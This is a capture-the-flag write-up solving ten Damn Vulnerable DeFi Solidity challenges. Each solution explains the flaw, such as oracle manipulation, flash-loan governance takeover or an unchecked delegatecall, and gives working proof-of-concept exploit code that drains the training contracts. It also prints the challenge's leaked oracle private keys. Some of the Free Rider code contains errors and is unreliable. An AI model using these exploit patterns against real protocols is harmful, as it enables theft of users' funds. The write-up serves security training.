# [Damn vulnerable defi](https://www.damnvulnerabledefi.xyz/) solved


[1. Unstoppable](#1-unstoppable)      
[2. Naive Receiver](#2-naive-receiver)  
[3. Truster](#3-truster)    
[4. Side Entrance](#4-side-entrance)     
[6. Selfie](#6-selfie)     
[7. Compromised](#7-compromised)    
[8. Puppet](#8-puppet)  
[9. Puppet-V2](#9-puppet-v2)    
[10. Free Rider](#10-free-rider)    
[11. Backdoor](#11-backdoor)

## 1. Unstoppable

### Challenge

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.
Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

### Contracts in scope

UnstoppableVault.sol  
UnstoppableMonitor.sol      
      
### Vulnerability

The `UnstoppableVault` contract contains a Denial-of-Service (DoS) vulnerability stemming from a fragile accounting invariant. The `flashLoan` function enforces a strict check requiring the vault's actual token balance (`totalAssets()`) to exactly match its internal share calculation (`convertToShares(totalSupply)`). However, the contract accepts direct token transfers that increase `totalAssets()` without updating the `totalSupply` accounting. By simply sending a small number of tokens directly to the vault's address, an attacker breaks this invariant. Once broken, the check `convertToShares(totalSupply) != balanceBefore` permanently fails, causing all future flash loan calls to revert with an `InvalidBalance()` error. This effectively bricks the flash loan feature for all users and triggers the `UnstoppableMonitor` to halt operations.

### Attack Summary

**Goal**
Permanently disable the `UnstoppableVault`'s flash loan functionality by breaking its internal accounting invariant.

**Steps**
1. Directly transfer any amount of DVT tokens to the `UnstoppableVault` contract address.
2. This increases the vault's actual token balance (`totalAssets()`) without altering its share accounting (`totalSupply`).
3. The `flashLoan` function's strict invariant check (`convertToShares(totalSupply) != balanceBefore`) now evaluates to true, causing all subsequent flash loan attempts to revert with `InvalidBalance()` and triggering the `UnstoppableMonitor` to halt the system.
<details><summary>PoC</summary>

```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
```
</details>


## 2. Naive receiver

### Challenge

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

### Contracts in scope

NaiveRecevierPool.sol
FlashLoanReceiver.sol    
BasicForwarder.sol   
Multicall.sol

### Vulnerability

The system is compromised by two distinct security flaws 
1. The `Borrower` contract's `onFlashLoan()` callback lacks proper authorization controls. It only verifies that the caller is the pool, failing to check if the transaction was actually authorized by the contract owner. This allows anyone to force the borrower to initiate flash loans. 
2. The pool's `withdraw()` function relies on a custom `_msgSender()` implementation designed for meta-transactions. It trusts a `trustedForwarder` and extracts the sender's address from the last 20 bytes of the transaction calldata. Because this context can be easily forged, an attacker can impersonate any depositor—including the pool deployer—to authorize a withdrawal and redirect the funds to an address of their choosing.

### Attack Summary

**Goal**
Drain a combined total of 1010 WETH from the Borrower and Pool contracts.

**Steps**
1. Force the `Borrower` contract to take out 10 separate flash loans (each carrying a 1 ETH fee) by calling the pool's `flashLoan` function on its behalf.
2. The accumulated fees drain the borrower's 10 ETH balance directly into the pool, bringing the pool's total balance to 1010 WETH (all belonging to the deployer).
3. Route a `withdraw()` call through the `trustedForwarder`, appending the pool deployer's address to the last 20 bytes of the calldata.
4. The pool's spoofed `_msgSender()` recognizes the deployer as the initiator, allowing the contract to bypass deposit checks and debit the deployer's entire balance.
5. Specify the attacker's recovery address as the receiver, successfully transferring the full 1010 WETH out of the pool.

<details><summary>PoC</summary>

```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory data = new bytes[](11);
        // encode flashLoan call and populate data array
        bytes memory message = abi.encodeCall(
            NaiveReceiverPool.flashLoan, (FlashLoanReceiver(receiver), address(weth), 0, "")
        );
        uint256 callNumber = 10;
        for (uint256 i = 0; i < callNumber; i++) {
            data[i] = message;
        }
        // encode withdraw call and append to the data array
        bytes memory message2 = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), 
            bytes32(uint256(uint160(deployer)))
        );
        data[10] = message2;

        //encode Multicall data
        bytes memory callData = abi.encodeCall(pool.multicall, data);

        // create request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: callData,
            deadline: block.timestamp
        });
        // hash request
        bytes32 requestHash = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
            )
        );
        // sign request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk,  requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        // execute
        forwarder.execute(request, signature);
    }
```
</details>


## 3. Truster

### Challenge

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### Contracts in scope

TrusterLenderPool.sol

### Vulnerability
The `TrusterLenderPool` contract is vulnerable to an **Arbitrary External Call** flaw within its `flashLoan` function. The contract utilizes OpenZeppelin's `Address.functionCall` to execute a user-supplied `data` payload against a user-supplied `target` address. 

Because there are no restrictions on which contract can be called or what functions can be executed, an attacker can force the pool (as `msg.sender`) to interact with the DVT token contract. This allows the attacker to hijack the pool's authority to approve its own funds for spending by an external address.

### Attack Summary

**Goal:**  
To drain the pool’s entire balance of 1 million DVT tokens and transfer them to the recovery account in a single atomic transaction.

**Steps:**
1. **Trigger the Callback:** Call the `flashLoan` function with an amount of 0. Borrowing zero tokens ensures that the pool's final balance check will pass instantly without needing to repay a debt.
2. **Permission Hijacking:** Pass the DVT token address as the `target` and a signature for the `approve` function as the `data`. This instructs the pool to grant you a maximum allowance of its token holdings.
3. **Internal Execution:** The pool executes `target.functionCall(data)`, which results in the pool contract itself calling the token contract and authorizing you to spend 1 million DVT.
4. **Fund Recovery:** Immediately following the `flashLoan` call—within the same transaction—the attacker uses `transferFrom` to move the authorized tokens from the pool to the designated recovery account.
<details><summary>PoC</summary>

```solidity
    contract DrainPool {
        constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {
            bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                token.balanceOf(address(pool))
            );

            pool.flashLoan(0, address(this), address(token), data);

            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
        }
    }
```
```solidity
        /**
        * CODE YOUR SOLUTION HERE
        */
        function test_truster() public checkSolvedByPlayer {
            DrainPool dp = new DrainPool(token, pool, recovery);
        }
```
</details>


## 4. Side entrance

### Challenge

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

### Contracts in scope
SideEntranceLenderPool.sol

### Vulnerability

The `flashLoan()` function contains an Accounting Logic Flaw where the contract fails to distinguish between a loan repayment and a new deposit.

### Attack Summary

**Goal**
Drain the pool's entire ETH balance by converting a temporary flash loan into a permanent recorded deposit that can be withdrawn.

**Steps**
1. Call `flashLoan()` to borrow the pool's entire ETH balance.
2. Inside the required `execute()` callback, deposit the borrowed ETH back into the pool using the contract's deposit function.
3. Allow the flash loan to complete; the pool's repayment check passes because its raw ETH balance has been restored, but the internal accounting now credits the attacker's address for the deposited amount.
4. Call the pool's `withdraw()` function to extract the newly credited balance, successfully draining all of the pool's funds.

<details><summary>PoC</summary>

```solidity
    contract sideEntrance is IFlashLoanEtherReceiver {
        SideEntranceLenderPool pool;
        address recovery;

        constructor(address _pool, address _recovery) {
            pool = SideEntranceLenderPool(_pool);
            recovery = _recovery;
        }

        function borrow(uint256 amount) external {
            pool.flashLoan(amount);
        }

        function execute() external payable {
            pool.deposit{value: msg.value}();
        }

        function recover() external {
            pool.withdraw();
            payable(recovery).transfer(address(this).balance);
        }

        receive() external payable{}
    }
```
```solidity
        /**
         * CODE YOUR SOLUTION HERE
         */
        function test_sideEntrance() public checkSolvedByPlayer {
            sideEntrance sE = new sideEntrance(address(pool), recovery);
            sE.borrow(ETHER_IN_POOL);
            sE.recover();
        }
```
</details>

## 6. Selfie

### Challenge

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.  
What could go wrong, right ?    
You start with no DVT tokens in balance, and the pool has 1.5 million at risk.  
Rescue all funds from the pool and deposit them into the designated recovery account.

### Contracts in scope
SelfiePool.sol
SimpleGovernance.sol
ISimpleGovernance.sol

### Vulnerability
The contract suffers from a flash loan-based governance manipulation vulnerability, stemming from two primary flaws. 
First, the pool allows its entire token supply to be borrowed via a flash loan. 
Second, the governance mechanism fails to distinguish between long-term token holders and transient holders—such as those merely holding tokens for the duration of a flash loan. 
Because voting power is calculated based on immediate token balance rather than committed or historical ownership, an attacker can temporarily acquire enough voting power to bypass governance thresholds, allowing them to propose and authorize administrative actions (such as `emergencyExit()`) that would otherwise require significant, long-term capital commitment.

### Attack Summary

**Goal:**  
To drain the protocol's assets by using flash-loaned voting power to force the execution of the `emergencyExit()` function to the designated recovery account.

**Steps:**
1. **Acquire Voting Power:** Take out a large flash loan of DVT tokens to gain a temporary majority of the total supply.
2. **Self-Delegate:** Call the delegation function to assign the voting power of these borrowed tokens to the your address.
3. **Queue Malicious Action:** Use the temporary voting majority to propose and queue a governance action that calls `emergencyExit()`, targeting the recovery account.
4. **Repay Loan:** Return the borrowed tokens to the pool in the same transaction to satisfy the flash loan requirements.
5. **Execute Proposal:** After the mandatory governance delay (timelock) has passed, trigger the execution of the queued proposal to exfiltrate the funds.

<details><summary>PoC</summary>

```solidity
    contract FlashLoanReceiver is IERC3156FlashBorrower {
        SimpleGovernance governance;
        SelfiePool pool;
        address recovery;
        uint256 actionId;
        address votes;

        constructor(address _governance, address _pool, address _recovery) {
            governance = SimpleGovernance(_governance);
            pool = SelfiePool(_pool);
            recovery = _recovery;
        }

        function onFlashLoan(
            address, /*initiator*/
            address token,
            uint256 amount,
            uint256, /*fee*/
            bytes calldata /*data*/
        ) external returns (bytes32) {
            votes = token;
            flashVote();
            DamnValuableVotes(token).approve(address(pool), amount);

            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }
        
        function flashVote() internal {
            DamnValuableVotes(votes).delegate(address(this));
            bytes memory data = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
            actionId = governance.queueAction(address(pool), 0, data);
        }

        function getId() external view returns (uint256) {
            return actionId;
        }
    }
```
```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        FlashLoanReceiver flr = new FlashLoanReceiver(address(governance), address(pool), recovery);
        pool.flashLoan(flr, address(token), TOKENS_IN_POOL, "");

        vm.warp(block.timestamp + 2 days + 1);
        governance.executeAction(flr.getId());
    }
```
</details>


## 7. Compromised

### Challenge

While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:  

```
HTTP/2 200 OK   
content-type: text/html 
content-language: en    
vary: Accept-Encoding   
server: cloudflare  

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30 

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35 
``` 

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.  
This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.    
Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

### Contracts in scope
Exchange.sol
TrustfulOracle.sol
TrustfulOracleInitializer.sol

### Vulnerability

The protocol suffers from a critical **Sensitive Data Exposure** vulnerability where cryptographic secrets were leaked through an improperly configured server response. 

Although the server’s `content-type` header was set to `text/html`, the body contained raw hexadecimal data. Through a multi-stage decoding process (Hex to ASCII, then Base64 to String), it was discovered that the server was broadcasting the private keys of two out of the three trusted oracle reporters. Because the oracle system likely relies on a simple majority (2-of-3) to reach consensus, an attacker gaining control of these keys effectively achieves `Oracle Authority Compromise`. This allows the attacker to sign and broadcast arbitrary price data, bypassing the integrity of the NFT marketplace's valuation system.


### Attack Summary

**Goal**
To drain funds from the marketplace by using the compromised oracle keys to manipulate the NFT price and executing a profitable buy-low, sell-high strategy.

**Steps**
1. Extract the hex data from the server's response and decode it (hex to ASCII to base64) to recover the two private keys.
2. Use the compromised keys to submit malicious oracle updates, driving the NFT price drastically downward.
3. Purchase the NFT at the artificially deflated price.
4. Submit another oracle update to restore the NFT price to its original, higher value.
5. Sell the NFT at the inflated price to capture the profit.  

<details><summary>PoC</summary>

```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);

        vm.prank(source1);
        oracle.postPrice(symbols[0], 0);

        vm.prank(source2);
        oracle.postPrice(symbols[0], 0);

        vm.prank(player);
        uint256 id = exchange.buyOne{value: 1}();

        vm.prank(source1);
        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);

        vm.prank(source2);
        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);

        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

    }
```
</details>


## 8. Puppet    

### Challenge 

There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.  
There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.   
Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.

### Contracts in scope
PuppetPool.sol
IUniswapV1Exchange.sol
IUniswapV1Factory.sol

### Vulnerability

This challenge exhibits a classic price oracle manipulation vulnerability. The lending pool relies on a Uniswap V1 exchange as its sole pricing mechanism without implementing any safeguards against spot-price manipulation. The core flaw resides in the `_computeOraclePrice()` function, which calculates the DVT/ETH exchange rate directly from the Uniswap pool's current balances:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

Because this implementation depends on instantaneous reserve ratios from a pool with relatively low liquidity, an attacker can easily skew the price. By artificially flooding the Uniswap pool with DVT tokens, the attacker can drastically drive down the oracle price, which in turn lowers the collateral requirement required by the lending pool to borrow funds.

### Attack Summary

**Goal**
Drain all 100,000 DVT tokens from the lending pool using minimal collateral and deposit them into the designated recovery address.

**Steps**
1. Approve the Uniswap exchange to spend the attacker's DVT token balance.
2. Swap a large amount of DVT tokens for ETH on the Uniswap exchange, heavily inflating the DVT side of the pool.
3. Trigger the oracle, which now calculates a massively deflated price for DVT due to the manipulated token ratio.
4. Calculate the new, drastically reduced collateral requirement based on the skewed oracle price.
5. Borrow all 100,000 DVT tokens from the lending pool by providing only the minimal ETH collateral.
6. Transfer the newly borrowed DVT tokens directly to the designated recovery address.    

<details><summary>PoC</summary>

```solidity
    contract OracleManipulation {
        PuppetPool lendingPool;
        DamnValuableToken token;
        IUniswapV1Exchange uniswapV1Exchange;
        address recovery;

        constructor(address _lendingPool, address _token, address _uniswapV1Exchange, address _recovery) {
            lendingPool = PuppetPool(_lendingPool);
            token = DamnValuableToken(_token);
            uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
            recovery = _recovery;
        }

        function attack(uint256 playerBalance, uint256 poolBalance) external payable {
            token.approve(address(uniswapV1Exchange), playerBalance);
            uniswapV1Exchange.tokenToEthSwapInput(playerBalance, 1, block.timestamp);
            uint256 amount = lendingPool.calculateDepositRequired(poolBalance);

            lendingPool.borrow{value: amount}(poolBalance, recovery);
        }

        receive() external payable {}
    }
```
```solidity
        /**
        * CODE YOUR SOLUTION HERE
        */
        function test_puppet1() public checkSolvedByPlayer {
            OracleManipulation om = new OracleManipulation(
                address(lendingPool), address(token), address(uniswapV1Exchange), recovery
                );
            token.transfer(address(om), PLAYER_INITIAL_TOKEN_BALANCE);
            om.attack{value: PLAYER_INITIAL_ETH_BALANCE}(PLAYER_INITIAL_TOKEN_BALANCE, POOL_INITIAL_TOKEN_BALANCE);
        }
```
</details>

## 9. Puppet V2    

### Challenge  

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.   
Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?  
You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!    
Save all funds from the pool, depositing them into the designated recovery account. 

### Contracts in scope
PuppetV2Pool.sol
UniswapV2Library.sol

### Vulnerability

The Puppet V2 challenge reveals a persistent price oracle manipulation vulnerability. Despite the protocol upgrading from Uniswap V1 to V2 and shifting to wrapped ETH (WETH) as collateral, the fundamental flaw remains unchanged. The core issue resides in the `_getOracleQuote()` function within the `PuppetV2Pool` contract, which fetches spot prices using `UniswapV2Library.getReserves()` and calculates quotes based on these immediate reserves. Because the oracle relies entirely on the instantaneous state of a single liquidity pool, an attacker can easily manipulate the price. By executing a massive swap that drastically skews the reserve ratio, the attacker can artificially depress the perceived value of DVT relative to WETH.

### Attack Summary

**Goal**
Drain the entire DVT token balance from the lending pool using minimal WETH collateral, and transfer the funds to the designated recovery address.

**Steps**
1. Convert available ETH to WETH, as the lending pool now requires WETH for collateral.
2. Swap a large amount of DVT tokens for WETH on Uniswap V2 to heavily skew the pool's reserve ratio.
3. Observe the manipulated oracle, which now reports DVT as being significantly less valuable relative to WETH.
4. Calculate the greatly reduced collateral requirement based on this artificially lowered price.
5. Approve and deposit the minimal required amount of WETH into the lending pool as collateral.
6. Borrow the entire DVT balance from the pool.
7. Transfer all borrowed DVT tokens to the designated recovery address. 

<details><summary>PoC</summary>

```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 1, path, player, block.timestamp);

        uint256 depositAmount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

        weth.approve(address(lendingPool), depositAmount);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }
```
</details>


## 10. Free Rider   

### Challenge

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH. 
A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!  
They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract. 
You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.  
If only you could get free ETH, at least for an instant.    

### Contracts in scope
FreeRiderNFTMarketplace.sol
FreeRiderRecoveryManager.sol

### Vulnerability

The Free Rider challenge exposes a critical state mutation flaw in the NFT marketplace's payment logic, specifically within the `_buyOne()` function. The vulnerability stems from an incorrect order of operations: the function transfers the NFT to the buyer before executing the payment to the seller. When determining the payment recipient, the contract dynamically queries `_token.ownerOf(tokenId)`. Because the NFT has already been transferred, this query returns the buyer's address rather than the original seller. Consequently, the buyer receives both the NFT and a full refund of their payment, effectively allowing them to purchase NFTs for zero net cost.

### Attack Summary

**Goal**
Exploit the marketplace's payment logic to acquire all 6 NFTs at no cost, claim the 45 ETH recovery bounty, and repay the initial capital used to trigger the exploit.

**Steps**
1. Obtain the required initial capital by executing a Uniswap V2 flash swap.
2. Convert the borrowed WETH into native ETH to satisfy the marketplace's payment currency requirements.
3. Call the marketplace's `buyMany()` function to purchase all 6 NFTs.
4. Due to the payment flaw, the marketplace immediately refunds the purchase price back to the attacker, resulting in zero net cost for the NFTs.
5. Transfer all 6 NFTs to the recovery manager contract, including calldata encoding the attacker's address to claim the bounty.
6. Receive the 45 ETH bounty from the recovery manager.
7. Convert the necessary amount of ETH back to WETH and repay the Uniswap V2 flash swap, accounting for the 0.3% protocol fee.   

<details><summary>PoC</summary>

```solidity
    contract RecoverNft is IERC721Receiver {

        address uniswapPair;
        WETH weth;
        FreeRiderNFTMarketplace marketPlace;
        DamnValuableNFT nft;
        uint256[] ids;
        address recovery;

        constructor(address _uniswapPair, address payable _weth, address payable _marketPlace, address _nft,
            address _recovery, uint256[] memory _ids) {
            uniswapPair = _uniswapPair;
            weth = WETH(_weth);
            marketPlace = FreeRiderNFTMarketplace(_marketPlace);
            nft = DamnValuableNFT(_nft);
            ids = _ids;
            recovery = _recovery
        }

        function uniswapV2Call(address sender, uint amount0, uint, /*amount1*/ bytes calldata /*data*/) external {
            weth.withdraw(amount0);

            marketPlace.buyMany{value: 15e18}(ids);

            for (uint256 i = 0; i < ids.length; ++i) {
                nft.SafeTransferFrom(address(this), recovery, i, abi.encode(sender));
            }
            uint256 repayAmount = amount0 * 1000 / 997 + 1;
            weth.deposit{value: repayAmount}();
            weth.transfer(uniswapPair, repayAmount);

            payable(sender).transfer(address(this).balance);
        }

        function onERC721Received(address, /*operator*/ address, /*from*/ uint256, /*tokenId*/ bytes calldata /*data*/) external pure returns (bytes4) {
            return IERC721Receiver.onERC721Received.selector;
        }

        receive() external payable {}
    }
```
```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < ids.length; ++i) {
            ids[i] = i;
        }
        RecoverNft rNFT = new RecoverNft(address(uniswapPair), payable(address(weth)), payable(address(marketplace)), address(nft), address(recoveryManager), ids);
        bytes memory flash = abi.encode("FlashSwap");
        uniswapPair.swap(NFT_PRICE, 0, address(rNFT), flash);
    }
```
</details>


## 11. Backdoor

### Challenge

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.    
The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.   
Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. 
Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.

### Contract in scope
WalletRegistry.sol

### Vulnerability

The Backdoor challenge exposes a critical oversight in the integration between the `WalletRegistry` and the Safe wallet initialization process. The registry offers token rewards to beneficiaries who deploy new Safe wallets, and it validates certain parameters during the `proxyCreated` callback—specifically, the owner count, beneficiary status, and fallback manager. However, it completely fails to inspect or restrict the `delegatecall` parameters (`to` and `data`) passed to the Safe contract's `setup` function during initialization. Because `delegatecall` executes logic within the context and permissions of the newly created wallet, we can inject a malicious delegate call. This allows us to execute arbitrary code—such as approving token transfers—on behalf of the new wallet before the registry even deposits the reward tokens.

### Attack Summary

**Goal**
Steal the 40 DVT tokens (10 DVT each) allocated for the four registered beneficiaries by exploiting the unvalidated delegate call during wallet creation, and deposit them into the recovery address.

**Steps**
1. Deploy a malicious contract containing a function that approves the contract address to spend the wallet's tokens.
2. For each of the four beneficiaries, create a new Safe wallet proxy. Configure the setup parameters to set the beneficiary as the sole owner (to pass the registry's checks) and include a `delegatecall` to the contract.
3. During wallet initialization, the `delegatecall` executes within the context of the new wallet, granting the contract address token allowances.
4. The `WalletRegistry` callback triggers, verifies the owner and fallback parameters, and deposits 10 DVT into the newly created wallet as a reward.
5. Immediately use `transferFrom` to extract the 10 DVT from each newly funded wallet to the contract address.
6. Transfer the accumulated 40 DVT to the designated recovery address.

<details><summary>PoC</summary>

Import "SafeProxy"
```solidity 
    contract Rescue {
        Safe singletonCopy;
        SafeProxyFactory walletFactory;
        WalletRegistry walletRegistry;
        DamnValuableToken token;
        address[] users;
        address recovery;

        constructor(address _singletonCopy, 
            address _walletFactory, 
            address _walletRegistry, 
            address _token, 
            address[] memory _users, 
            address _recovery) 
        payable {
            singletonCopy = Safe(payable(_singletonCopy));
            walletFactory = SafeProxyFactory(_walletFactory);
            walletRegistry = WalletRegistry(_walletRegistry);
            token = DamnValuableToken(_token);
            users = _users;
            recovery = _recovery;
        }

        function approve(DamnValuableToken asset, address spender) external {
            asset.approve(spender, type(uint256).max);
        }

        function recover() external {
            for (uint256 i = 0; i < users.length; ++i) {
                address _owner = users[i];
                address[] memory owner = new address[](1);
                owner[0] = _owner;

                bytes memory maliciousData = abi.encodeCall(this.approve, (token, address(this)));
                
                bytes memory initializer = abi.encodeCall(
                    Safe.setup, (
                        owner, 1, address(this), maliciousData, address(0), address(0), 0, payable(address(0))
                    )
                );

                SafeProxy proxy = walletFactory.createProxyWithCallback(
                    address(singletonCopy), initializer, 1, walletRegistry
                );

                token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
            }
            token.transfer(recovery, token.balanceOf(address(this)));
        }

    }
```
```solidity
        /**
         * CODE YOUR SOLUTION HERE
         */
        function test_backdoor() public checkSolvedByPlayer {
            Rescue rescue = new Rescue(
                address(singletonCopy), address(walletFactory), address(walletRegistry), address(token), users, recovery
            );
            rescue.recover();
        }
```
</details>